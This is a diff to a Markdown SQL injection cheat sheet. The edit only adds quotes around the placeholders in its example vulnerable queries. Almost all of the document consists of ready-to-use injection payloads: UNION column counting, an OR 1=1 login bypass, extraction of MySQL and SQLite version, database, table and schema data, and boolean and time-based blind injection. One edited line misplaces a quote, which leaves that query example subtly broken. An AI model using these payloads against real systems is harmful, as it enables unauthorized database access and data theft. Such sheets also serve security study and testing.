@@ -3,13 +3,13 @@
 ###### While doing sqli through urls, { `;#`,`;--`,`;//` } need to be encoded specially 
 
 ### Finding no of columns in table
-  _[Vulnearable code]_ : `SELECT * FROM table_name WHERE username=$input_user AND pass=$input_pass`
+  _[Vulnearable code]_ : `SELECT * FROM table_name WHERE username='$input_user' AND 'pass=$input_pass'`
   
 * _[$input_user]_ : `' UNION SELECT 1,2,3.. FROM table_name --`
 * _[$input_user]_ : `' ORDER BY n --`  [If we get error for n, then n-1 will be no of columns]
  
 ### Limiting no of rows
-  _[Vulnearable code]_ : `SELECT * FROM table_name WHERE username=$input_user AND pass=$input_pass`
+  _[Vulnearable code]_ : `SELECT * FROM table_name WHERE username='$input_user' AND pass='$input_pass'`
   
 * _[$input_user]_ : `' OR 1=1 LIMIT 1 --`
 
@@ -25,7 +25,7 @@
   [attack] => user = `\`  & pass = `OR 1=1 --`
 
 ## For Mysql
-  _[Vulnearable code]_ : `SELECT * FROM table_name WHERE username=$input_user AND pass=$input_pass`
+  _[Vulnearable code]_ : `SELECT * FROM table_name WHERE username='$input_user' AND pass='$input_pass'`
 ###### Assume no of columns to be 3
 #### Finding version and databases
 *  _[$input_user]_ : `' UNION SELECT 1,@@version,database() --`
@@ -40,7 +40,7 @@
 ## For sqlite
  In sqlite __sqlite_master__ replaces __information_schema__
  
-  _[Vulnearable code]_ : `SELECT * FROM table_name WHERE username=$input_user AND pass=$input_pass`
+  _[Vulnearable code]_ : `SELECT * FROM table_name WHERE username='$input_user' AND pass='$input_pass'`
 
 #### Extracting table names
   _[$input_user]_ : `' UNION SELECT name FROM sqlite_master WHERE type='table'`
@@ -48,7 +48,7 @@
   _[$input_user]_ : `' UNION SELECT sql FROM sqlite_master WHERE type='table' AND tbl_name = 'table_name'`
 
 ## Blind SQLI
-  _[Vulnearable code]_ : `SELECT * FROM table_name WHERE username=$input_user AND pass=$input_pass`
+  _[Vulnearable code]_ : `SELECT * FROM table_name WHERE username='$input_user' AND pass='$input_pass'`
   
 *  _[$input_user]_ : `' WHERE EXISTS(SELECT * FROM table_name WHERE username LIKE "%a%") --`   [It will ask whether a user with letter "a" or "A" containing in his name]
 *  _[$input_user]_ : `' WHERE EXISTS(SELECT * FROM table_name WHERE username LIKE "__a%") --`	 [It will ask whether the letter is at 3rd place or NOT]
@@ -60,7 +60,7 @@
   _[$input_user]_ : `' WHERE EXISTS(SELECT * FROM table_name WHERE username LIKE BINARY "%a%") --` [To make a case sensitive search, use BINARY right after LIKE]
 
 ## Time-based Blind SQLI
-  _[Vulnearable code]_ : `SELECT * FROM table_name WHERE username=$input_user AND pass=$input_pass`
+  _[Vulnearable code]_ : `SELECT * FROM table_name WHERE username='$input_user' AND pass='$input_pass'`
 
 *  _[$input_user]_ : `' OR (SELECT SLEEP(10) FROM table_name WHERE username='something') --`
 *  _[$input_user]_ : `' OR IF(username='something',SLEEP(10),0) --`
